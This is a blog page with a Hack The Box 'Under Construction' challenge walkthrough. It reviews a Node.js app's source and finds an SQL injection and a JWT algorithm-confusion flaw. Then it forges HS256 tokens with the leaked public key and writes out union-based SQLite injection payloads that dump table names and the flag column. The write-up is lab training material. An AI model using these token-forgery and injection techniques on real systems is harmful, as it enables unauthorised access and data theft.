<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>HTB - Under Construction - Walkthrough | Ee-Vah?</title><meta name=keywords content="htb,walkthrough,under-construction,challenge-box,medium-box,completed-challenge,retired,static-code-analysis,source-code-analysis,sql-injection,cve-2022-23541,jwt,jwt-vulnerabilities"><meta name=description content="SYNOPSIS Outlining the attack path demonstrated in this writeup is much easier through a picture rather than a description, since a picture is worth a thousand words.
The aim of this walkthrough is to provide help with the Under Construction challenge on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges."><meta name=author content="bluewalle"><link rel=canonical href=https://bluewalle.github.io/posts/walkthroughs/htb/beginner-track/under-construction/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe+FVUFzPh7U=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://bluewalle.github.io/main/img/favicon.png><link rel=icon type=image/png sizes=16x16 href=https://bluewalle.github.io/main/img/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://bluewalle.github.io/main/img/favicon-32x32.png><link rel=apple-touch-icon href=https://bluewalle.github.io/main/img/apple-touch-icon.png><link rel=mask-icon href=https://bluewalle.github.io/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-123-45","auto"),ga("send","pageview"))</script><meta property="og:title" content="HTB - Under Construction - Walkthrough"><meta property="og:description" content="SYNOPSIS Outlining the attack path demonstrated in this writeup is much easier through a picture rather than a description, since a picture is worth a thousand words.
The aim of this walkthrough is to provide help with the Under Construction challenge on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges."><meta property="og:type" content="article"><meta property="og:url" content="https://bluewalle.github.io/posts/walkthroughs/htb/beginner-track/under-construction/"><meta property="og:image" content="https://bluewalle.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-06-08T10:00:00+00:00"><meta property="article:modified_time" content="2023-06-08T10:00:00+00:00"><meta property="og:site_name" content="Just Keep Swimming"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://bluewalle.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="HTB - Under Construction - Walkthrough"><meta name=twitter:description content="SYNOPSIS Outlining the attack path demonstrated in this writeup is much easier through a picture rather than a description, since a picture is worth a thousand words.
The aim of this walkthrough is to provide help with the Under Construction challenge on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://bluewalle.github.io/posts/"},{"@type":"ListItem","position":2,"name":"HTB - Under Construction - Walkthrough","item":"https://bluewalle.github.io/posts/walkthroughs/htb/beginner-track/under-construction/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HTB - Under Construction - Walkthrough","name":"HTB - Under Construction - Walkthrough","description":"SYNOPSIS Outlining the attack path demonstrated in this writeup is much easier through a picture rather than a description, since a picture is worth a thousand words.\nThe aim of this walkthrough is to provide help with the Under Construction challenge on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.","keywords":["htb","walkthrough","under-construction","challenge-box","medium-box","completed-challenge","retired","static-code-analysis","source-code-analysis","sql-injection","cve-2022-23541","jwt","jwt-vulnerabilities"],"articleBody":"SYNOPSIS Outlining the attack path demonstrated in this writeup is much easier through a picture rather than a description, since a picture is worth a thousand words.\nThe aim of this walkthrough is to provide help with the Under Construction challenge on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.\nIt belongs to a series of tutorials that aim to help out with finishing the Beginner-Track challenges.\nAfter reading the challenge description\nA company that specialises in web development is creating a new site that is currently under construction. Can you obtain the flag? we set out and download the provided challenge files. There is only one this time: - Under Construction.zip -.\nThen we use the provided sha256 checksum to make sure and verify, that the challenge files were not tampered with.\n# shell command echo -n \"9f5c670ddfe72f08828eee3732ee8b00340fe7cf6448294039a4a384aff7e08c Under Construction.zip\" | sha256sum -c # terminal interaction ┌─[eu-dedivip-1]─[10.10.14.63]─[htb-bluewalle@htb-d5vawtsv6o]─[~/under-construction] └──╼ [★]$ ll total 8.0K -rw-r--r-- 1 htb-bluewalle htb-bluewalle 5.9K Jun 8 12:22 'Under Construction.zip' ┌─[eu-dedivip-1]─[10.10.14.63]─[htb-bluewalle@htb-d5vawtsv6o]─[~/under-construction] └──╼ [★]$ echo -n \"9f5c670ddfe72f08828eee3732ee8b00340fe7cf6448294039a4a384aff7e08c Under Construction.zip\" | sha256sum -c Under Construction.zip: OK ┌─[eu-dedivip-1]─[10.10.14.63]─[htb-bluewalle@htb-d5vawtsv6o]─[~/under-construction] └──╼ [★]$ Everything seems fine, so we unpack the archive,\n# shell command mkdir challenge-files unzip -P hackthebox Under\\ Construction.zip -d challenge-files/ # terminal interaction ┌─[eu-dedivip-1]─[10.10.14.63]─[htb-bluewalle@htb-d5vawtsv6o]─[~/under-construction] └──╼ [★]$ mkdir challenge-files ┌─[eu-dedivip-1]─[10.10.14.63]─[htb-bluewalle@htb-d5vawtsv6o]─[~/under-construction] └──╼ [★]$ unzip -P hackthebox Under\\ Construction.zip -d challenge-files/ Archive: Under Construction.zip inflating: challenge-files/index.js inflating: challenge-files/package.json creating: challenge-files/middleware/ inflating: challenge-files/middleware/AuthMiddleware.js creating: challenge-files/helpers/ inflating: challenge-files/helpers/DBHelper.js inflating: challenge-files/helpers/JWTHelper.js creating: challenge-files/routes/ inflating: challenge-files/routes/index.js creating: challenge-files/views/ inflating: challenge-files/views/auth.html inflating: challenge-files/views/index.html ┌─[eu-dedivip-1]─[10.10.14.63]─[htb-bluewalle@htb-d5vawtsv6o]─[~/under-construction] └──╼ [★]$ and use tree to get a better view of the extracted files.\n# shell command tree challenge-files/ # terminal interaction ┌─[eu-dedivip-1]─[10.10.14.63]─[htb-bluewalle@htb-d5vawtsv6o]─[~/under-construction] └──╼ [★]$ tree challenge-files/ challenge-files/ ├── helpers │ ├── DBHelper.js │ └── JWTHelper.js ├── index.js ├── middleware │ └── AuthMiddleware.js ├── package.json ├── routes │ └── index.js └── views ├── auth.html └── index.html 4 directories, 8 files ┌─[eu-dedivip-1]─[10.10.14.63]─[htb-bluewalle@htb-d5vawtsv6o]─[~/under-construction] └──╼ [★]$ All the files are backend source files:\nfive javascript one JSON two html STATIC CODE ANALYSIS Since it looks like, that the next part of the challenge is going to revolve analyzing source code (static analysis), let’s open these files in a code editor. The one that comes preinstalled on the pwnbox is vscodium, the clone of Microsoft’s popular Visual Studio Code editor - without of course the embedded user data tracking features.\n# shell command codium . # terminal interaction ┌─[eu-dedivip-1]─[10.10.14.63]─[htb-bluewalle@htb-d5vawtsv6o]─[~/under-construction] └──╼ [★]$ cd challenge-files/ ┌─[eu-dedivip-1]─[10.10.14.63]─[htb-bluewalle@htb-d5vawtsv6o]─[~/under-construction/challenge-files] └──╼ [★]$ codium . ┌─[eu-dedivip-1]─[10.10.14.63]─[htb-bluewalle@htb-d5vawtsv6o]─[~/under-construction/challenge-files] └──╼ [★]$ Much better – now let’s start with the index.js file. Here is a very brief source analysis on it:\n# index.js # - REQUIREMENTS -\nit uses the express web framework – sadly no vulnerabilities were reported for - “express”: “^4.17.1” - (from package.json) it uses two parsers: body-parser – to parse incoming request bodies – no vulnerabilities for - “body-parser”: “^1.19.0” - cookie-parser – to parse cookie headers – no vuln. for “cookie-parser”: “^1.4.4” - link to routes/index.js it uses nunjucks – templating engine for js – “nunjucks”: “^3.2.0” –\u003e 2 vulnerabilities CVE-2023-2142 (XXS - Medium severity) CWE-1321 (Prototype Pollution- High serverity) - CODE -\nit’s the basic structure of an express application registers middleware functions to handle URL-encoded data, cookies and nunjucks templates defines a catch-all route to handle any requests that do not match any other routes starts the application listening on port 1337 Let’s check out those aforementioned routes (- routes/index.js -).\n# routes/index.js # - REQUIREMENTS -\nimport path module from the standard Node.js library links to - ../middleware/AuthMiddleware - - ../helpers/JWTHelper - - ../helpers/DBHelper - - CODE -\ndefines a number of routes for a simple authentication system home route - (/) - – get the user user exists –\u003e render index.html with user data user does not exists –\u003e 404 error is returned get(’/auth’, …) – render auth.html template – contains a form that users can use to login or register get(’/logout’, …) – clear user’s session cookie and redirect to - /auth - route post(’/auth’, …) – handle user login and registration requests empty username or password –\u003e redirect to - /auth - username already exists in the database –\u003e redirect to - /auth - with error message username does not exists in db –\u003e create new user in db and redirect to - /auth - with success message registered user NO username:password match in db –\u003e redirect to - /auth - with error message username:passowrd match in db –\u003e create a JWT token for the user, redirects to home page - ’/’ - and set the session cookie with the newly created token # index.html # There is nothing really interesting in the index.html besides\n... \u003cdiv class=\"card-body\"\u003e Welcome {{ user.username }}\u003cbr\u003e This site is under development. \u003cbr\u003e Please come back later. \u003c/div\u003e which should reflect our username back to us.\n# auth.html # The auth.html describes and defines the login form and the corresponding actions.\n# middleware/AuthMiddleware.js # Continuing with the middleware/AuthMiddleware.js file, all it does in a nutshell is to authenticate users using JWT tokens.\nsession cookie NOT set –\u003e redirect to - /auth - session cookie is set –\u003e decode JWT token – extract username from token – set username property # helpers/DBHelper.js # simply functions that interact witht he SQLite db (database) getUser –\u003e get user from db checkUser –\u003e check username in the db createUser –\u003e create user entry in the db attempLogin –\u003e attempt log user in by username:password There is one very important thing to note here,\n... db.get(`SELECT * FROM users WHERE username = '${username}'`, (err, data) =\u003e { if (err) return rej(err); res(data); }); ... which looks susceptible to common SQL injection attacks. Given that the other functions use query/name placeholders, only the getUser() appears vulnerable.\n# helpers/JWT.js # - REQUIREMENTS -\nimport fs (for file system usage) module from the standard Node.js library uses jsonwebtoken – THREE vulnerabilities with medium severity issues for version - 8.5.1 - CVE-2022-23539 –\u003e Use of a Broken or Risky Cryptographic Algorithm CVE-2022-23540 –\u003e Improper Authentication CVE-2022-23541 –\u003e Improper Restriction of Security Token Assignment The following snippet we find proves very important\n... Specifically, tokens signed with an asymmetric public key could be verified with a symmetric HS256 algorithm. This can lead to successful validation of forged tokens. ... ... HMAC Algorithm Attack: an attacker creates the token by setting the signing algorithm to a symmetric HS256 instead of an asymmetric RS256, leading the API to blindly verify the token using the HS256 algorithm using the public key as a secret key. Since the public key is known, the attacker can correctly forge valid JWTs. ... and reading about algorithm confusion attacks all but verifies it.\nThis vulnerability would in a nutshell enable us to forge arbitrary JWT tokens.\n- CODE -\nfunctions to sign and verify JSON Web Tokens (JWTs) read files: - ./private.key - - ../public.key - sign() –\u003e sign with private key – use RS256 algorithm decode() –\u003e decode JWT token with public key – use RS256 and HS256 algorithm Notice how there we are allowed to use BOTH symmetric (HS256) as well as asymmetric (RS256) cryptographic functions for decoding/decrypting the JWT token.\nALGORITHM CONFUSION ATTACK With the vulnerability identified, let’s try and exploit it by following the steps described in the PortSwigger post. The steps for performing an algorithm confusion attack are as follows:\nObtain the server’s public key Convert the public key to a suitable format Create a malicious JWT with a modified payload and the alg header set to HS256. Sign the token with HS256, using the public key as the secret. Firing up a browser and taking a closer look at our target’s webpage lands us with a login page.\nStep 1 – Obtain the server’s public key. Following the instructions and setting our sight on first obtaining the public key, we try to extract it from a pair of existing JWTs. So let’s fire up burp and intercept the JWTs.\nSince we already analysed the backend code, we already know, that only in the case of an already logged in user do the server sign the token.\n// routes/index.js ... let token = await JWTHelper.sign({ username: username.replace(/'/g, \"\\'\\'\").replace(/\"/g, \"\\\"\\\"\") }) ... So first we will have to create one. Registering some test credentials like - username:password - and logging in does provide us with the desired, signed token.\nBefore moving on to the next step, we first send the request to burp’s Repeater and then we install the JWT Editor extension in Burp (Extender –\u003e BApp Store –\u003e Search for JWT Editor –\u003e Install both of the extensions: JWT Editor Keys and JSON Web Tokens).\nCopying our signed token to the JSON Web Tokens extension reveals, that RSA public key is indeed sent along in the Payload part. This is how our decoded JWT\nHeaders = { \"alg\": \"RS256\", \"typ\": \"JWT\" } Payload = { \"username\": \"username\", \"pk\": \"-----BEGIN PUBLIC KEY-----\\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA95oTm9DNzcHr8gLhjZaY\\nktsbj1KxxUOozw0trP93BgIpXv6WipQRB5lqofPlU6FB99Jc5QZ0459t73ggVDQi\\nXuCMI2hoUfJ1VmjNeWCrSrDUhokIFZEuCumehwwtUNuEv0ezC54ZTdEC5YSTAOzg\\njIWalsHj/ga5ZEDx3Ext0Mh5AEwbAD73+qXS/uCvhfajgpzHGd9OgNQU60LMf2mH\\n+FynNsjNNwo5nRe7tR12Wb2YOCxw2vdamO1n1kf/SMypSKKvOgj5y0LGiU3jeXMx\\nV8WS+YiYCU5OBAmTcz2w2kzBhZFlH6RK4mquexJHra23IGv5UJ5GVPEXpdCqK3Tr\\n0wIDAQAB\\n-----END PUBLIC KEY-----\\n\", \"iat\": 1686225169 } Signature = \"g32U0iT0x4F8WbPcUGQ4SaA9OlgNt15kZotnypKu8V2HkeFNB7bG2yoXhkqGCj9CLI9L71SH2z20AJHSQPc6CMf2kwd-4QSjy1Oq6dr70cOcuMYbzeFpiJwVqtn1TJwcFyCv6lC1FQiOtFYg9k-yAkoD99K6wknBKxoo49N38aXs83a6pm9eJ1e1PbhtHtT5w2f5mi8cIeL5jVwu5TmzZfSyIgrjM82_czgmfE67ajay9oUBU9EHpTVXcNmItuDGFOHREGvRNWcysnGEjkm7-P4RwGDzOIciMrPEfpUZJWRjw78lVEwH_s0iINtFBG3KtsRGglO9itTDN8VGLe6apQ\" and the public RSA key looks like.\n-----BEGIN PUBLIC KEY-----\\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA95oTm9DNzcHr8gLhjZaY\\nktsbj1KxxUOozw0trP93BgIpXv6WipQRB5lqofPlU6FB99Jc5QZ0459t73ggVDQi\\nXuCMI2hoUfJ1VmjNeWCrSrDUhokIFZEuCumehwwtUNuEv0ezC54ZTdEC5YSTAOzg\\njIWalsHj/ga5ZEDx3Ext0Mh5AEwbAD73+qXS/uCvhfajgpzHGd9OgNQU60LMf2mH\\n+FynNsjNNwo5nRe7tR12Wb2YOCxw2vdamO1n1kf/SMypSKKvOgj5y0LGiU3jeXMx\\nV8WS+YiYCU5OBAmTcz2w2kzBhZFlH6RK4mquexJHra23IGv5UJ5GVPEXpdCqK3Tr\\n0wIDAQAB\\n-----END PUBLIC KEY-----\\n But it’s still full of those new line characters (’\\n’) so we remove them and we make sure to have an appending new line at the end.\n-----BEGIN PUBLIC KEY----- MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA95oTm9DNzcHr8gLhjZaY ktsbj1KxxUOozw0trP93BgIpXv6WipQRB5lqofPlU6FB99Jc5QZ0459t73ggVDQi XuCMI2hoUfJ1VmjNeWCrSrDUhokIFZEuCumehwwtUNuEv0ezC54ZTdEC5YSTAOzg jIWalsHj/ga5ZEDx3Ext0Mh5AEwbAD73+qXS/uCvhfajgpzHGd9OgNQU60LMf2mH +FynNsjNNwo5nRe7tR12Wb2YOCxw2vdamO1n1kf/SMypSKKvOgj5y0LGiU3jeXMx V8WS+YiYCU5OBAmTcz2w2kzBhZFlH6RK4mquexJHra23IGv5UJ5GVPEXpdCqK3Tr 0wIDAQAB -----END PUBLIC KEY----- With this, we are through with the first step.\nStep 2 – Converting the public key to a suitable format. Given that our public RSA key is already in a PEM format, we continue with the fourth substep:\nSubstep 4 – Go to the Decoder tab and Base64-encode the PEM. This is how the base64 encoded public RSA key looks like.\nLS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUE5NW9UbTlETnpjSHI4Z0xoalphWQprdHNiajFLeHhVT296dzB0clA5M0JnSXBYdjZXaXBRUkI1bHFvZlBsVTZGQjk5SmM1UVowNDU5dDczZ2dWRFFpClh1Q01JMmhvVWZKMVZtak5lV0NyU3JEVWhva0lGWkV1Q3VtZWh3d3RVTnVFdjBlekM1NFpUZEVDNVlTVEFPemcKaklXYWxzSGovZ2E1WkVEeDNFeHQwTWg1QUV3YkFENzMrcVhTL3VDdmhmYWpncHpIR2Q5T2dOUVU2MExNZjJtSAorRnluTnNqTk53bzVuUmU3dFIxMldiMllPQ3h3MnZkYW1PMW4xa2YvU015cFNLS3ZPZ2o1eTBMR2lVM2plWE14ClY4V1MrWWlZQ1U1T0JBbVRjejJ3Mmt6QmhaRmxINlJLNG1xdWV4SkhyYTIzSUd2NVVKNUdWUEVYcGRDcUszVHIKMHdJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg== As for the rest of the substeps,\nSubstep 5 – Go back to the JWT Editor Keys tab and click New Symmetric Key. Substep 6 – In the dialog, click Generate to generate a new key in JWK format. Substep 7 – Replace the generated value for the k parameter with a Base64-encoded PEM key that you just copied. Substep 8 – Save the key. we can do them quite easily.\nBefore moving on to the next step, let’s do a quick check and make sure that we can correctly sign a token.\nSending the request, we get a valid response back, which implies that our signature was accepted.\nStep 3/4 – Create a malicious JWT with a modified payload and sign the token. This step combines the steps 3 and 4:\nStep 3 – Create a malicious JWT with a modified payload and the alg header set to HS256. Step 4 – Sign the token with HS256, using the public key as the secret. We will perform the last two steps continously, one after the other as we play around and modify our sql injection payload.\nOur next course of action is to exploit the sql injection vulnerability we found in - helpers/DBHelper.js - and use it as our payload.\n... db.get(`SELECT * FROM users WHERE username = '${username}'`, (err, data) =\u003e { if (err) return rej(err); res(data); }); ... SQL INJECTION Since we already know that the dababase we are interacting with is an SQLite database (sqlite3 requirement in - helpers/DBHelper.js - ), we can simply look for an SQLite Injection cheat sheet. This cheet-sheet) from PayloadsAllTheThings is one of the more common ones.\nOur main goal here is to simply retrieve or leak some data - the flag in our case - from the database.\nMoreover, we already know that we are querying the - users - table as a default, so our first order of business is to determine the number of rows and columns that we are presented with. Our default sql query looks like this:\n`SELECT * FROM users WHERE username = '${username}'` We can use the UNION operator to combine the results of two or more SELECT statements into a single result. This technique is called union-based SQL Injection. It is important to note, that every SELECT statement within UNION must have the same number of columns.\nSince integer values are automatically converted to other types if need be, we use them to determine the returned number of columns.\nWe start out with 1 and increase our number until we find the correct number of columns.\n// payload ... \"username\": \"username' union select 1'\", ... # http response ... \u003cbody\u003e \u003cpre\u003e Error: SQLITE_ERROR: SELECTs to the left and right of UNION do not have the same number of result columns \u003c/pre\u003e \u003c/body\u003e ... Adding an other column does not help either. But we get valid results when using three values and we get the second column of the second row displayed in the response.\n// payload ... \"username\": \"username' union select 1,2,3'\", ... # http response ... \u003cdiv class=\"card-body\"\u003e Welcome 2\u003cbr\u003e This site is under development. \u003cbr\u003e Please come back later. \u003c/div\u003e ... So let’s play around with it a bit. First we display the sqlite version\n// payload ... \"username\": \"username' union select 1, sqlite_version(),3'\", ... # http response ... \u003cdiv class=\"card-body\"\u003e Welcome 3.30.1\u003cbr\u003e This site is under development. \u003cbr\u003e Please come back later. \u003c/div\u003e ... and then to limit the number of rows returned by our SELECT statement, we use the LIMIT and OFFSET clauses to display the second row.\n// payload ... \"username\": \"username' union select 1, 2, 3 limit 1 offset 1 --'\", ... # http response ... \u003cdiv class=\"card-body\"\u003e Welcome username\u003cbr\u003e This site is under development. \u003cbr\u003e Please come back later. \u003c/div\u003e ... We can list the tables by using the following technique:\nSELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' Use limit X+1 offset X, to extract all tables. Listing tables: LIMIT=1, OFFSET=0\n// payload ... \"username\": \"username' union select 1, tbl_name, 3 from sqlite_master where type='table' and tbl_name not like 'sqlite_%' limit 1 offset 0 --'\", ... # http response ... \u003cdiv class=\"card-body\"\u003e Welcome flag_storage\u003cbr\u003e This site is under development. \u003cbr\u003e Please come back later. \u003c/div\u003e ... Listing tables: LIMIT=2, OFFSET=1\n// payload ... \"username\": \"username' union select 1, tbl_name, 3 from sqlite_master where type='table' and tbl_name not like 'sqlite_%' limit 2 offset 1 --'\", ... # http response ... \u003cdiv class=\"card-body\"\u003e Welcome users\u003cbr\u003e This site is under development. \u003cbr\u003e Please come back later. \u003c/div\u003e ... Listing tables: LIMIT=3, OFFSET=2\n// payload ... \"username\": \"username' union select 1, tbl_name, 3 from sqlite_master where type='table' and tbl_name not like 'sqlite_%' limit 3 offset 2 --'\", ... # http response ... \u003cdiv class=\"card-body\"\u003e Welcome username\u003cbr\u003e This site is under development. \u003cbr\u003e Please come back later. \u003c/div\u003e ... Listing tables: LIMIT=4, OFFSET=3\n// payload ... \"username\": \"username' union select 1, tbl_name, 3 from sqlite_master where type='table' and tbl_name not like 'sqlite_%' limit 4 offset 3 --'\", ... # http response ... user username' union select 1, tbl_name, 3 from sqlite_master where type='table' and tbl_name not like 'sqlite_%' limit 4 offset 3 --' doesn't exist in our database. With that, we have the following ‘interesting’ tables on our hands:\nflag_storage users username Our primary interest here lies with the flag_storage table, so we list it’s column’s:\n// payload ... \"username\": \"username' union select 1, sql, 3 from sqlite_master where type!='meta' and sql not null and name='flag_storage' --'\", ... # http response ... \u003cdiv class=\"card-body\"\u003e Welcome CREATE TABLE \u0026quot;flag_storage\u0026quot; ( \u0026quot;id\u0026quot;\tINTEGER PRIMARY KEY AUTOINCREMENT, \u0026quot;top_secret_flaag\u0026quot;\tTEXT )\u003cbr\u003e This site is under development. \u003cbr\u003e Please come back later. \u003c/div\u003e So we have two columns:\nid top_secret_flaag GRABBING THE FLAG All that’s left now is to grab the flag, so we query the - flag_storage - table’s - top_secret_flaag - column.\n// payload ... \"username\": \"username' union select 1, top_secret_flaag, 3 from flag_storage --'\", ... # http response ... \u003cdiv class=\"card-body\"\u003e Welcome HTB{\u003cflag\u003e}\u003cbr\u003e This site is under development. \u003cbr\u003e Please come back later. \u003c/div\u003e Finally, we submit the flag and review the challenge before terminating the challenge box.\n","wordCount":"2649","inLanguage":"en","datePublished":"2023-06-08T10:00:00Z","dateModified":"2023-06-08T10:00:00Z","author":{"@type":"Person","name":"bluewalle"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://bluewalle.github.io/posts/walkthroughs/htb/beginner-track/under-construction/"},"publisher":{"@type":"Organization","name":"Ee-Vah?","logo":{"@type":"ImageObject","url":"https://bluewalle.github.io/main/img/favicon.png"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://bluewalle.github.io/ accesskey=h title="Just Keep Swimming (Alt + H)"><img src=https://bluewalle.github.io/apple-touch-icon.png alt aria-label=logo height=35>Just Keep Swimming</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://bluewalle.github.io/posts/ title=posts><span>posts</span></a></li><li><a href=https://bluewalle.github.io/categories/ title=categories><span>categories</span></a></li><li><a href=https://bluewalle.github.io/tags/ title=tags><span>tags</span></a></li><li><a href=https://bluewalle.github.io/about title=about><span>about</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://bluewalle.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://bluewalle.github.io/posts/>Posts</a></div><h1 class=post-title>HTB - Under Construction - Walkthrough</h1><div class=post-meta><span title='2023-06-08 10:00:00 +0000 +0000'>June, 2023</span>&nbsp;·&nbsp;13 min&nbsp;·&nbsp;2649 words&nbsp;·&nbsp;bluewalle</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#synopsis><strong>SYNOPSIS</strong></a></li><li><a href=#static-code-analysis><strong>STATIC CODE ANALYSIS</strong></a><ul><li><a href=#-indexjs-><em><strong># index.js #</strong></em></a></li><li><a href=#-routesindexjs-><em><strong># routes/index.js #</strong></em></a></li><li><a href=#-indexhtml-><em><strong># index.html #</strong></em></a></li><li><a href=#-authhtml-><em><strong># auth.html #</strong></em></a></li><li><a href=#-middlewareauthmiddlewarejs-><em><strong># middleware/AuthMiddleware.js #</strong></em></a></li><li><a href=#-helpersdbhelperjs-><em><strong># helpers/DBHelper.js #</strong></em></a></li><li><a href=#-helpersjwtjs-><em><strong># helpers/JWT.js #</strong></em></a></li></ul></li><li><a href=#algorithm-confusion-attack><strong>ALGORITHM CONFUSION ATTACK</strong></a><ul><li><a href=#step-1----obtain-the-servers-public-key><strong>Step 1</strong> &ndash; <strong>Obtain the server&rsquo;s public key</strong>.</a></li><li><a href=#step-2----converting-the-public-key-to-a-suitable-format><strong>Step 2</strong> &ndash; <strong>Converting the public key to a suitable format</strong>.</a></li><li><a href=#step-34----create-a-malicious-jwt-with-a-modified-payload-and-sign-the-token><strong>Step 3/4</strong> &ndash; <strong>Create a malicious JWT with a modified payload and sign the token.</strong></a></li></ul></li><li><a href=#sql-injection><strong>SQL INJECTION</strong></a></li><li><a href=#grabbing-the-flag><strong>GRABBING THE FLAG</strong></a></li></ul></nav></div></details></div><div class=post-content><h2 id=synopsis><strong>SYNOPSIS</strong><a hidden class=anchor aria-hidden=true href=#synopsis>#</a></h2><p>Outlining the <strong>attack path</strong> demonstrated in this <strong>writeup</strong> is much easier through a picture rather than a description, since <strong>a picture is worth a thousand words</strong>.</p><p><img loading=lazy src=/walkthroughs/htb/beginner-track/under-construction/attack-path_under-construction.png alt="Attack Path - Under Construction" title="Attack Path -  Under Construction"></p><p>The aim of this walkthrough is to provide help with the <a href=https://app.hackthebox.com/challenges/111 title="Under Construction">Under Construction</a> challenge on the <a href=https://hackthebox.com title="Hack The Box website">Hack The Box website</a>. Please <strong>note</strong> that no <strong>flags</strong> are directly provided here. Moreover, <strong>be aware</strong> that this is only <strong>one</strong> of the <strong>many</strong> ways to solve the challenges.</p><p>It belongs to a series of tutorials that aim to help out with finishing the <a href=https://app.hackthebox.com/tracks/Beginner-Track title=Beginner-Track>Beginner-Track</a> challenges.</p><p>After reading the <strong>challenge description</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>A company that specialises in web development is creating a new site that is currently under construction. Can you obtain the flag?
</span></span></code></pre></div><p>we set out and <strong>download</strong> the provided <strong>challenge files</strong>. There is only one this time: - <em>Under Construction.zip</em> -.</p><p><img loading=lazy src=/walkthroughs/htb/beginner-track/under-construction/challenge-download.png alt=challenge-download title=challenge-download></p><p>Then we use the provided <strong>sha256 checksum</strong> to make sure and <strong>verify</strong>, that the challenge files were not <strong>tampered</strong> with.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># shell command</span>
